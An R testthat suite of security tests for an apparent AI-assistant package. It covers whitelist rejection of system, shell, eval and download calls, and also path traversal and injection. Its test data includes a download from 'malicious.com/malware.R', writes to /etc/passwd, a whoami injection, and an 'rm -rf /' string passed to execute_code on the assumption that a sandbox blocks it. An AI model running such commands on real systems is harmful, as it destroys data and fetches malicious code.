# =============================================================================
# Test Security-Focused Edge Cases
# These tests validate input sanitization, access control, and security measures
# =============================================================================

library(testthat)

# Helper function to safely clean up global environment objects
cleanup_test_objects <- function(...) {
  objects <- c(...)
  for (obj in objects) {
    if (exists(obj, envir = .GlobalEnv)) {
      rm(list = obj, envir = .GlobalEnv)
    }
  }
}

# =============================================================================
# TEST: execute_r_function() Whitelist Enforcement
# =============================================================================

test_that("execute_r_function rejects system command execution", {
  result <- execute_r_function("system", "ls -la")
  expect_false(result)
})

test_that("execute_r_function rejects system2 command execution", {
  result <- execute_r_function("system2", "ls", "-la")
  expect_false(result)
})

test_that("execute_r_function rejects shell execution", {
  result <- execute_r_function("shell", "dir")
  expect_false(result)
})

test_that("execute_r_function rejects file deletion", {
  result <- execute_r_function("file.remove", "/tmp/test.txt")
  expect_false(result)
})

test_that("execute_r_function rejects unlink", {
  result <- execute_r_function("unlink", "/tmp/test_dir", TRUE)
  expect_false(result)
})

test_that("execute_r_function rejects eval", {
  result <- execute_r_function("eval", "system('ls')")
  expect_false(result)
})

test_that("execute_r_function rejects parse", {
  result <- execute_r_function("parse", "system('ls')")
  expect_false(result)
})

test_that("execute_r_function rejects source", {
  result <- execute_r_function("source", "/etc/passwd")
  expect_false(result)
})

test_that("execute_r_function rejects download.file", {
  result <- execute_r_function("download.file", "http://malicious.com/malware.R")
  expect_false(result)
})

test_that("execute_r_function rejects writeLines", {
  result <- execute_r_function("writeLines", "malicious content", "/etc/passwd")
  expect_false(result)
})

# =============================================================================
# TEST: execute_code() Input Validation
# =============================================================================

test_that("execute_code handles code injection attempt", {
  # Attempt to inject system commands
  malicious_code <- 'system("rm -rf /")'
  result <- execute_code(malicious_code)
  # Should execute but the system command should fail in sandboxed environment
  expect_true(is.logical(result))
})

test_that("execute_code handles nested eval injection", {
  malicious_code <- 'eval(parse(text = "system(\'whoami\')"))'
  result <- execute_code(malicious_code)
  expect_true(is.logical(result))
})

test_that("execute_code handles environment variable access", {
  # This is a legitimate operation but should be handled
  code <- 'Sys.getenv("HOME")'
  result <- execute_code(code)
  expect_true(result)
})

test_that("execute_code handles setwd attempts", {
  code <- 'setwd("/")'
  result <- execute_code(code)
  # Should execute but may fail due to permissions
  expect_true(is.logical(result))
})

# =============================================================================
# TEST: Access Code Security
# =============================================================================

test_that("save_access_code_to_disk uses secure location", {
  skip_if_not(exists("get_access_code_path"))
  
  path <- get_access_code_path()
  
  # Should be in user's home directory, not system directories
  expect_true(grepl("\\.(rgent|local|config)", path, ignore.case = TRUE) || 
              grepl("AppData|Library|home", path, ignore.case = TRUE))
  
  # Should not be world-readable
  expect_false(grepl("^/tmp/", path))
  expect_false(grepl("^/var/", path))
})

test_that("access code storage handles special characters", {
  skip_if_not(exists("save_access_code_to_disk"))
  skip_if_not(exists("load_access_code_from_disk"))
  
  # Test with special characters that could cause issues
  special_codes <- c(
    "code_with_spaces here",
    "code/with/slashes",
    "code\\with\\backslashes",
    "code'with'quotes",
    'code"with"doublequotes',
    "code\nwith\nnewlines",
    "code\twith\ttabs"
  )
  
  for (code in special_codes) {
    result <- tryCatch({
      save_access_code_to_disk(code)
      loaded <- load_access_code_from_disk()
      !is.null(loaded)
    }, error = function(e) TRUE)
    
    expect_true(result, info = paste("Failed for code:", code))
  }
})

# =============================================================================
# TEST: Path Traversal Prevention
# =============================================================================

test_that("file operations reject path traversal attempts", {
  skip_if_not(exists("get_dataframe_info"))
  
  # Attempt path traversal via dataframe name
  result <- tryCatch({
    get_dataframe_info("../../etc/passwd")
  }, error = function(e) {
    list(error = e$message)
  })
  
  # Should not expose system files
  expect_true(is.list(result))
})

test_that("context capture doesn't expose sensitive paths", {
  skip_if_not(exists("capture_context"))
  
  context <- tryCatch({
    capture_context()
  }, error = function(e) {
    list(error = e$message)
  })
  
  # Should be a list and not contain sensitive system paths
  expect_true(is.list(context))
  
  # If there's working directory info, it should be user directory
  if (!is.null(context$working_directory)) {
    expect_false(grepl("^/(etc|var/log|root)", context$working_directory))
  }
})

# =============================================================================
# TEST: Large Payload Handling
# =============================================================================

test_that("execute_code handles extremely large strings", {
  # Generate a very large string
  large_string <- paste(rep("a", 100000), collapse = "")
  code <- paste0('large_var <- "', large_string, '"')
  
  result <- tryCatch({
    execute_code(code)
  }, error = function(e) {
    FALSE
  })
  
  expect_true(is.logical(result))
  cleanup_test_objects("large_var")
})

test_that("execute_code handles deeply nested structures", {
  # Create deeply nested list
  code <- "nested <- list(a = list(b = list(c = list(d = list(e = 1)))))"
  result <- execute_code(code)
  expect_true(result)
  cleanup_test_objects("nested")
})

test_that("data functions handle large dataframes", {
  skip_if_not(exists("get_dataframe_info"))
  
  # Create a moderately large dataframe
  assign("large_df_test", data.frame(
    x = rnorm(10000),
    y = rnorm(10000),
    z = sample(letters, 10000, replace = TRUE)
  ), envir = .GlobalEnv)
  
  result <- tryCatch({
    get_dataframe_info("large_df_test")
  }, error = function(e) {
    list(error = e$message)
  })
  
  expect_true(is.list(result))
  cleanup_test_objects("large_df_test")
})

# =============================================================================
# TEST: JSON Injection Prevention
# =============================================================================

test_that("context capture handles JSON special characters in names", {
  skip_if_not(exists("capture_context"))
  
  # Create variables with JSON-unsafe names
  assign('test_var_with"quotes', 1, envir = .GlobalEnv)
  
  result <- tryCatch({
    context <- capture_context()
    is.list(context)
  }, error = function(e) {
    TRUE  # Error handling is acceptable
  })
  
  expect_true(result)
  
  # Cleanup - need to handle special characters
  tryCatch({
    rm(list = 'test_var_with"quotes', envir = .GlobalEnv)
  }, error = function(e) NULL)
})

test_that("dataframe info handles special column names", {
  skip_if_not(exists("get_dataframe_info"))
  
  assign("special_col_df", data.frame(
    `col with spaces` = 1:3,
    `col"with"quotes` = 4:6,
    `col<with>brackets` = 7:9,
    check.names = FALSE
  ), envir = .GlobalEnv)
  
  result <- tryCatch({
    get_dataframe_info("special_col_df")
  }, error = function(e) {
    list(error = e$message)
  })
  
  expect_true(is.list(result))
  cleanup_test_objects("special_col_df")
})

# =============================================================================
# TEST: Resource Exhaustion Prevention
# =============================================================================

test_that("execute_code handles recursive functions", {
  # This should not cause stack overflow
  code <- "
    safe_recurse <- function(n) {
      if (n <= 0) return(0)
      if (n > 100) return(100)  # Safety limit
      safe_recurse(n - 1) + 1
    }
    recurse_result <- safe_recurse(50)
  "
  result <- execute_code(code)
  expect_true(result)
  cleanup_test_objects("safe_recurse", "recurse_result")
})

test_that("data functions handle empty dataframes", {
  skip_if_not(exists("get_dataframe_info"))
  
  assign("empty_df", data.frame(), envir = .GlobalEnv)
  
  result <- tryCatch({
    get_dataframe_info("empty_df")
  }, error = function(e) {
    list(error = e$message)
  })
  
  expect_true(is.list(result))
  cleanup_test_objects("empty_df")
})

# =============================================================================
# TEST: Input Type Validation
# =============================================================================

test_that("execute_code handles non-character input", {
  # execute_code may coerce or handle non-character input
  result <- tryCatch({
    execute_code(123)
  }, error = function(e) {
    FALSE
  })
  # The function may accept numeric if it can be parsed
  expect_true(is.logical(result))
})

test_that("execute_code handles list input", {
  # execute_code may coerce or handle list input
  result <- tryCatch({
    execute_code(list(a = 1))
  }, error = function(e) {
    FALSE
  })
  # The function may accept list if it can be coerced
  expect_true(is.logical(result))
})

test_that("execute_r_function rejects numeric function names", {
  result <- tryCatch({
    execute_r_function(123, "param1")
  }, error = function(e) {
    FALSE
  })
  expect_false(result)
})

# =============================================================================
# TEST: Environment Isolation
# =============================================================================

test_that("execute_code modifies global environment as expected", {
  # Verify that code execution happens in global environment
  execute_code("isolation_test <- 999")
  expect_true(exists("isolation_test", envir = .GlobalEnv))
  expect_equal(get("isolation_test", envir = .GlobalEnv), 999)
  cleanup_test_objects("isolation_test")
})

test_that("execute_code doesn't leak into package namespace", {
  execute_code("pkg_leak_test <- 123")
  
  # Should be in global env, not package namespace
  expect_true(exists("pkg_leak_test", envir = .GlobalEnv))
  
  # Check it's not in rstudioai namespace
  pkg_env <- tryCatch(
    asNamespace("rstudioai"),
    error = function(e) NULL
  )
  
  if (!is.null(pkg_env)) {
    expect_false(exists("pkg_leak_test", envir = pkg_env, inherits = FALSE))
  }
  
  cleanup_test_objects("pkg_leak_test")
})

